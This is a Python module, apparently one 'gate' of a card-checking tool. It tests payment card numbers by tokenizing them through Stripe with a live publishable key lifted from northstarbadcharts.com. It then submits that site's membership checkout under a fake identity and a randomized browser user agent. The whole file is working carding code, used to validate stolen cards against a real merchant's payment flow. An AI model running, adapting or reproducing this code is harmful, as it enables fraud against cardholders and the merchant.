from .util import __extract_str
import requests
import random
import json

def check_northstarbadcharts(cc, identity):

	try:

		gate_url = "https://api.stripe.com/v1/payment_methods"
		gate2_url = "https://www.northstarbadcharts.com/membership-account/membership-checkout/"
		gate_user_agent = "Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/{}.{}".format(random.randint(11, 99),
			random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		splitted_card = cc.split('|')

		payment_header = {
			'Authority': 'api.stripe.com',
			'Path': '/v1/payment_methods',
			'Scheme': 'https',
			'Accept': 'application/json',
			'Accept-language': 'en-US,en;q=0.9',
			'Content-type': 'application/x-www-form-urlencoded',
			'Origin': 'https://js.stripe.com',
			'Referer': 'https://js.stripe.com/',
			'Sec-fetch-dest': 'empty',
			'Sec-fetch-mode': 'cors',
			'Sec-fetch-site': 'same-site',
			'User-agent': gate_user_agent
		}

		payment_data = 'type=card&card[number]={}&card[cvc]={}&card[exp_month]={}&card[exp_year]={}&guid=69500903-6117-4012-8fba-bae015db9e7428266e&muid=9f152355-0b26-4a85-ace3-87fd15759ae9a6ae21&sid=3f0cc768-b2aa-4b6e-a85b-944d4d57805fceceba2&pasted_fields=number&payment_user_agent=stripe.js%2F1304e8886%3B+stripe-js-v3%2F1304e8886&time_on_page=29595&referrer=https%3A%2F%2Fwww.northstarbadcharts.com%2F&key=pk_live_51J0BTHAccnJh2MQZPbsFMpG8K66EGRlh8c0m9W0pIII8G32Bzv3S1g5HkI3U9oozUhl89fnzYvYvOFjIn2Io5c9j00M0IhUdxs'.format(splitted_card[0],
			splitted_card[3],
			splitted_card[1],
			splitted_card[2])

		payment_request = requests.post(gate_url, headers=payment_header, data=payment_data)

		if payment_request.status_code < 300:

			id_ = __extract_str(payment_request.text, '"id": "','"')
			brand = __extract_str(payment_request.text, '"brand": "','"')

			payment_header = {
				'Authority': 'www.northstarbadcharts.com',
				'Path': '/membership-account/membership-checkout/',
				'Scheme': 'https',
				'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'Content-type': 'application/x-www-form-urlencoded',
				'Cookie': 'PHPSESSID=r0idid3lrtpqsud5s4sp05lo0j;pmpro_visit=1;__stripe_mid=3ffa896e-4042-4cf9-ba4a-5a91d53eca979a4712;__stripe_sid=b64550c8-bcbc-4c07-92be-ee6257af67fe8fbc22',
				'Origin': 'https://www.northstarbadcharts.com',
				'Referer': 'https://www.northstarbadcharts.com/membership-account/membership-checkout/',
				'Sec-fetch-dest': 'document',
				'Sec-fetch-mode': 'navigate',
				'X-requested-with': 'XMLHttpRequest',
				'Sec-fetch-site': 'same-origin',
				'User-agent': gate_user_agent
			}
	
			payment_data = 'level=1&checkjavascript=1&username={}&password={}&password2={}&bemail={}&bconfirmemail={}&fullname=&gateway=stripe&CardType={}&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id={}&AccountNumber={}&ExpirationMonth={}&ExpirationYear={}'.format(identity["results"][0]["login"]["username"],
				identity["results"][0]["login"]["password"],
				identity["results"][0]["login"]["username"],
				identity["results"][0]["email"],
				identity["results"][0]["email"],
				brand,
				id_,
				splitted_card[0],
				splitted_card[1],
				splitted_card[2])

			payment_request = requests.post(gate2_url, headers=payment_header, data=payment_data)

			if payment_request.status_code < 300:

				return True

			else: return False

		else: return False

	except Exception as E: raise E